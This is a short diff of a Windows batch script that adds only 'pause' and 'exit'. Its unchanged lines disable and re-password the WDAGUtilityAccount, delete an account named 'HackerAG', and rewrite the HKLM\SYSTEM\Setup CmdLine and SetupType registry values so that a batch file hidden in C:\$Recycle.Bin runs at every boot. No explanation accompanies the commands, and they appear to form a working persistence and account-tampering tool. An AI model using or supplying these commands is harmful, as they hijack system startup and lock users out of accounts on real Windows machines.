@@ -1,3 +1,4 @@
+pause
 net user WDAGUtilityAccount /active:no
 net user HackerAG /delete
 net user WDAGUtilityAccount 29380523952697kfhskdfhkhsdfkjshdfkhHAKFAKFGUISGNSIN
@@ -24,3 +25,4 @@ reg delete "HKLM\SYSTEM\Setup" /v CmdLine /f
 reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d "C:\Windows\System32\cmd.exe /c C:\$Recycle.Bin\bye.bat"
 reg delete "HKLM\SYSTEM\Setup" /v SetupType /f
 reg add "HKLM\SYSTEM\Setup" /v SetupType /t REG_DWORD /d 2
+exit
